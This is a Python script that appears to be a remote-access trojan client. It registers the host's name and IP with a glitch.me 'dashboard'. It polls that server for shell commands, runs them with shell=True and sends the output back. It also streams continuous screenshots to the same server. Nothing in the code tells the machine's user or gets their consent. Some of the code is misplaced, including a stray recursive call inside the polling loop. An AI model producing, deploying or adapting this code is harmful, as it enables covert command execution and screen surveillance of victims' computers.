import requests
import socket
import platform
import time
import subprocess
import uuid
import io
from PIL import ImageGrab
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def register_to_dashboard(dashboard_url, client_id):
    data = {
        "id": client_id,
        "name": platform.node(),
        "ip": get_local_ip(),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        response = requests.post(f"{dashboard_url}/register", json=data, timeout=5)
        if response.status_code == 200:
            print("Successfully registered to dashboard.")
        else:
            print(f"Failed to register: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error registering to dashboard: {e}")

def poll_commands(dashboard_url, client_id):
    while True:
        try:
            # Poll the dashboard for commands targeted at this client
            response = requests.get(f"{dashboard_url}/getcmd/{client_id}", timeout=10)
            command = response.text.strip()
            if command:
                print(f"Received command: {command}")

                # Execute command locally
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error executing command: {e}"

                # Send output back to the dashboard
                requests.post(f"{dashboard_url}/postoutput/{client_id}", data={"output": output}, timeout=10)
                print("Output sent to server.")
        except requests.RequestException:
            pass  # Ignore connection errors, continue polling

        time.sleep(5)  # Poll every 5 seconds

        register_to_dashboard(DASHBOARD_URL, CLIENT_ID)
    poll_commands(DASHBOARD_URL, CLIENT_ID)
def generate_live_screen_frames():
    while True:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='JPEG')
        frame = buf.getvalue()
        yield frame
        time.sleep(0.1)  # ~10 FPS

def send_live_screen(dashboard_url, client_id):
    for frame in generate_live_screen_frames():
        try:
            requests.post(
                f"{dashboard_url}/live/{client_id}",
                files={"frame": ("frame.jpg", frame, "image/jpeg")},
                timeout=5
            )
        except Exception:
            time.sleep(1)  # On error, wait and retry

if __name__ == "__main__":
    DASHBOARD_URL = "https://petal-mahogany-olive.glitch.me"
    CLIENT_ID = str(uuid.uuid4())  # or use get_or_create_client_id() if you want it persistent

    register_to_dashboard(DASHBOARD_URL, CLIENT_ID)

    # Start both command polling and live screen
    import threading
    threading.Thread(target=poll_commands, args=(DASHBOARD_URL, CLIENT_ID), daemon=True).start()
    threading.Thread(target=send_live_screen, args=(DASHBOARD_URL, CLIENT_ID), daemon=True).start()

    while True:
        time.sleep(10)
